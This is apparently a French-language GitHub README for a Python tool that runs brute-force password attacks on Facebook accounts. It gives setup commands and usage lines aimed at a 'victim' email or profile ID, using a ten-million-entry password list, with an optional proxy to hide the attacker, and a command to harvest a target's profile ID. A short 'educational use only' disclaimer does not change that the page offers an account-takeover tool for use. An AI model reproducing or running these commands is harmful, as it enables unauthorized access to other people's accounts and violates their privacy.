Piratage Facebook

![image](file_00000000232c61fd91fb311b1688247b.png)
###### Puissante attaque par force brute sur Facebook.
***
### <p align="center">Commandes pour exécuter l'outil dans votre terminal Termux et Kali Linux
***

```bash
Remarque : Cet outil est conçu à des fins éducatives uniquement.
Veuillez ne pas endommager les appareils de qui que ce soit.
C'est pour juste testée, pas pour se venger.
 by rebelle masque 
```
## Langage utilisé pour créer cet outil :
- Python

## L'outil est compatible avec :
- Windows
- Kali Linux
- Android~Termux
- macOS
- Tous les systèmes d'exploitation utilisent Python (2.x, 3.x) avec les modules requis.

###### Installation
```bash
apt update && apt upgrade -y
```
```bash
apt install git -y
```
```bash
git clone https://github.com/RebelleMasque/Facebook_force-bruit-spy.git
```
```bash
cd Facebook_force-bruit-spy
```
```bash
bash setup
```
```bash
python facebook_hack.py
```

## Utilisation :
- **Vous pouvez utiliser Victim Adresse e-mail ou identifiant de profil Facebook** :

- **Force brute sur un compte Facebook sans proxy** :

* **Commande** : python facebook_hack.py -t victim@gmail.com -w 10MPASS.txt

- **Force brute sur un compte Facebook avec proxy** :

* **Commande** : python facebook_hack.py -t victim@gmail.com -w 10MPASS.txt -p 144.217.101.245:3129

- **Obtenir l'identifiant de profil Facebook cible** :

* **Commande** : python facebook_hack.py -g https://www.facebook.com/exemple
